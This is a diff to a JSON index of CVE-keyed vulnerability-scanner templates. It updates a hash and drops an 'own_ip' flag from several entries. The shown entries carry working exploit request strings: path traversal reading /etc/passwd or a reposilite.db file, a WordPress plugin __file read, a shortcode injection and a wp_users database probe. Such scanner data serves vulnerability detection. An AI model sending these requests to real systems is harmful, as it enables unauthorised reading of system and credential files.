@@ -1,6 +1,6 @@
 {
   "version": "2026.11.2",
-  "sha256": "d044502d2f4b43608ed7294403f237125c42594435ad0528aa127a2bf2cfa365",
+  "sha256": "437e867fc95611b5704effd47e02db65609f092efc3783248307579924d065c7",
   "templates": [
     {
       "id": "CVE-2001-0537",
@@ -3337,8 +3337,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}",
-      "own_ip": true
+      "request": "GET {{BaseURL}}"
     },
     {
       "id": "CVE-2019-5434",
@@ -6384,8 +6383,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /assets/app/something/services/AppModule.class/ HTTP/1.1",
-      "own_ip": true
+      "request": "GET /assets/app/something/services/AppModule.class/ HTTP/1.1"
     },
     {
       "id": "CVE-2021-27856",
@@ -11395,8 +11393,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/download/{{repeat('..%2F', 5)}}etc%2Fpasswd",
-      "own_ip": true
+      "request": "GET {{BaseURL}}/download/{{repeat('..%2F', 5)}}etc%2Fpasswd"
     },
     {
       "id": "CVE-2023-35844",
@@ -11411,8 +11408,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/v1/slack/image/slack-image{{repeat('%2F..', 3)}}%2Fetc%2Fpasswd",
-      "own_ip": true
+      "request": "GET {{BaseURL}}/api/v1/slack/image/slack-image{{repeat('%2F..', 3)}}%2Fetc%2Fpasswd"
     },
     {
       "id": "CVE-2023-36144",
@@ -12256,8 +12252,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/index.php?rest_route=%2Fessential-blocks%2Fv1%2Fproducts\u0026is_frontend=true\u0026attributes={\"__file\":\"/etc%2fpasswd\"}",
-      "own_ip": true
+      "request": "GET {{BaseURL}}/index.php?rest_route=%2Fessential-blocks%2Fv1%2Fproducts\u0026is_frontend=true\u0026attributes={\"__file\":\"/etc%2fpasswd\"}"
     },
     {
       "id": "CVE-2023-6875",
@@ -12516,8 +12511,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /?__wpdmxp=%27][/wpdm_package][wpdm_all_packages][wpdm_package%20id=%27 HTTP/1.1",
-      "own_ip": true
+      "request": "GET /?__wpdmxp=%27][/wpdm_package][wpdm_all_packages][wpdm_package%20id=%27 HTTP/1.1"
     },
     {
       "id": "CVE-2024-11868",
@@ -13450,8 +13444,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /javadoc/{{javadoc_path}}/raw/..%5c..%2f..%2f..%2f..%2f..%2freposilite.db HTTP/1.1",
-      "own_ip": true
+      "request": "GET /javadoc/{{javadoc_path}}/raw/..%5c..%2f..%2f..%2f..%2f..%2freposilite.db HTTP/1.1"
     },
     {
       "id": "CVE-2024-36412",
@@ -13980,8 +13973,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/nonauth/guestConfirm.cs?dest=VGVzdA0KQ1JMRjo%3d",
-      "own_ip": true
+      "request": "GET {{BaseURL}}/nonauth/guestConfirm.cs?dest=VGVzdA0KQ1JMRjo%3d"
     },
     {
       "id": "CVE-2024-5334",
@@ -15083,8 +15075,7 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /?instawp-database-manager=/../../../%2e%2fmigrate%2ftemplates%2fdebug%2fdb-table\u0026table_name=wp_users--%20- HTTP/1.1",
-      "own_ip": true
+      "request": "GET /?instawp-database-manager=/../../../%2e%2fmigrate%2ftemplates%2fdebug%2fdb-table\u0026table_name=wp_users--%20- HTTP/1.1"
     },
     {
       "id": "CVE-2025-26399",
@@ -16000,8 +15991,7 @@
         "guests",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/apps/guests/register/{{email}}/invalid-token-12345",
-      "own_ip": true
+      "request": "GET {{BaseURL}}/apps/guests/register/{{email}}/invalid-token-12345"
     },
     {
       "id": "CVE-2025-6174",
